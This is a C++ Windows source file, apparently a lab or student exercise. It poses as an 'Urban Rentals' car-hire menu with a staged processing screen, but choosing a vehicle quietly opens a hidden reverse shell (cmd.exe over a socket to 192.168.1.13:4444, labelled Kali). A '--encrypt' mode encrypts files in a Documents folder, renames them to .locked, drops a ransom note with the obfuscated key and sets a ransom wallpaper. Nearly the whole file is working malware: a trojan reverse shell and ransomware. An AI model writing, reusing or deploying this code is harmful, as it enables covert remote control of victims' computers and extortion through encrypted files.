#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#include <bcrypt.h>
#include <string>
#include <fstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <iostream>
#pragma comment(lib, "bcrypt.lib")


namespace fs = std::filesystem;
using namespace std;

class UrbanRentUI {


public:

    void showMenu() {
        system("cls");
        cout << " +----------------------------------------------------------+" << endl;
        cout << " |                                                          |" << endl;
        cout << " |                U R B A N   R E N T A L S                 |" << endl;
        cout << " |          ______________________________________          |" << endl;
        cout << " |                                                          |" << endl;
        cout << " |   [ SELECTION MENU ]                                     |" << endl;
        cout << " |   1. Luxury Sedan  (Executive Class)       - $45/Day     |" << endl;
        cout << " |   2. Premium SUV   (Family Outing)         - $60/Day     |" << endl;
        cout << " |   3. Sports Coupe  (High Performance)      - $95/Day     |" << endl;
        cout << " |                                                          |" << endl;
        cout << " +----------------------------------------------------------+" << endl;
        cout << "\n CHOOSE YOUR VEHICLE ID: ";
    }

    void showFakeProcessing() {
        system("cls");
        
        
        cout << "LOADING...";
        
        
        // loading bar
        
        for (int i = 0; i < 40; i++) {
            Sleep(60); 
            cout << (char)219; 
            if (i == 15) {
                
                cout <<endl<<endl<< "STATUS: VERIFYING LICENSE DOCUMENTS...";
            }
            if (i == 30) {
                
                cout <<endl<<endl<<"STATUS: PROCESSING SECURITY DEPOSIT...";
            }
        }
        cout <<endl<< "PROCESSING COMPLETE.";
        
        
        cout <<endl<< "PLEASE WAIT FOR CONFIRMATION EMAIL.";
        Sleep(1500);
    }
};


class KeyManager {
private:
    unsigned char mask = 0x64; 
public:
    string GenerateDynamicKey(int len) {
        vector<BYTE> buf(len);
        BCryptGenRandom(NULL, buf.data(), (ULONG)buf.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        
        // Character pool: A-Z, a-z, 0-9 (Safe for all terminals)
        const char pool[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        string key = "";
        for(BYTE b : buf) {
            key += pool[b % (sizeof(pool) - 1)]; 
        }
        return key;
    }

    string Obfuscate(const string& key) {
    string output = "";
    for (unsigned char c : key) {
        output += (char)(c ^ mask);
    }
    return output;
}
};


class VigenereEngine {
public:
    vector<unsigned char> transform(const vector<unsigned char>& data, const string& key) {
        vector<unsigned char> result;
        result.reserve(data.size());
        for (size_t i = 0; i < data.size(); i++) {
            unsigned char b = data[i];
            unsigned char k = (unsigned char)key[i % key.length()];
            result.push_back((unsigned char)((b + k) % 256));
        }
        return result;
    }
};

class FileScanner {
private:
    VigenereEngine engine;
    string logFilePath = "C:\\Users\\Public\\logs.txt";

    void writeToLog(const string& message) {
        ofstream logFile(logFilePath, ios::app);
        if (logFile.is_open()) {
            logFile << message << endl;
            logFile.close();
        }
    }

public:
    void processPath(const string& targetPath, const string& key) {
    if (!fs::exists(targetPath)) return;
    
    vector<fs::directory_entry> entries;
    try {
        // Collect all files first to avoid iterator issues during renaming
        for (const auto& entry : fs::recursive_directory_iterator(targetPath)) {
            entries.push_back(entry);
        }
    } catch (...) { return; }

    for (const auto& entry : entries) {
        // Filter: only regular files, skip exes, the readme, and the log file
        if (entry.is_regular_file() && 
            entry.path().extension() != ".exe" && 
            entry.path().filename() != "IMPORTANT_README.txt" && 
            entry.path().filename() != "logs.txt" &&
            entry.path().extension() != ".locked") {
            
            try {
                // 1. Open file in binary mode
                ifstream inFile(entry.path(), ios::binary);
                
                // 2. Read entire file into a binary vector (handles null bytes correctly)
                vector<unsigned char> content((istreambuf_iterator<char>(inFile)), (istreambuf_iterator<char>()));
                inFile.close();

                if (content.empty()) continue; // Skip empty files

                // 3. Encrypt using the vector-based Vigenere engine
                vector<unsigned char> encrypted = engine.transform(content, key);

                // 4. Write encrypted bytes back to the same file
                ofstream outFile(entry.path(), ios::binary);
                outFile.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
                outFile.close();
                
                // 5. Append .locked extension and log the action
                string newPath = entry.path().string() + ".locked";
                fs::rename(entry.path(), newPath);
                writeToLog("[LOCKED] " + newPath);
                 
                
            } catch (...) {
                // Skip files that are currently in use or permission denied
                continue; 
            }
        }
    }
}
};

class WallpaperManager {
public:
    static void apply() {
        string img = fs::current_path().string() + "\\ransom.jpg";
        if (fs::exists(img)) {
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)img.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
};


class PayloadManager {
private:
    KeyManager km;
    FileScanner scanner;

public:
    void ransomNote() {
        char* up = getenv("USERPROFILE");
        if (!up) return;
        string target = string(up) + "\\Documents\\TEST_DATA";
        string key = km.GenerateDynamicKey(16);
        
        scanner.processPath(target, key);

        
ofstream note(target + "\\IMPORTANT_README.txt");
note << "ID: ";
string obfuscated = km.Obfuscate(key);
for (unsigned char c : obfuscated) {
    note << hex << setfill('0') << setw(2) << (int)c;
}
note.close();

        WallpaperManager::apply();
        
    }

};


void RunReverseShell(string ip, int port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockaddr_in server = {0};
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip.c_str());
    server.sin_port = htons(port);

    if (WSAConnect(s, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) != SOCKET_ERROR) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        si.wShowWindow = SW_HIDE;
        char cmd[] = "cmd.exe";
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
}

int main(int argc, char* argv[]) {
    // EXECUTION FROM KALI (argc > 1)
    // When called, run the engine and quit immediately.
    // This completely prevents UI from showing in Kali terminal.
    if (argc > 1) {
        string cmd = argv[1];
        if (cmd == "--encrypt") {
            PayloadManager payload; 
            payload.ransomNote();
        } 
        return 0; 
    }

    string me = argv[0];

    UrbanRentUI ui;
    ui.showMenu(); 

    int choice = 0;
    cin >> choice; 

    if (choice >= 1 && choice <= 3) {
        ui.showFakeProcessing(); 

        // establish reverse shell connection to Kali
        thread t(RunReverseShell, "192.168.1.13", 4444);
        t.detach();
        
        // Keep the background process alive to hold the connection open
        while(true) {
            Sleep(10000); 
        }
    }

    return 0; 
}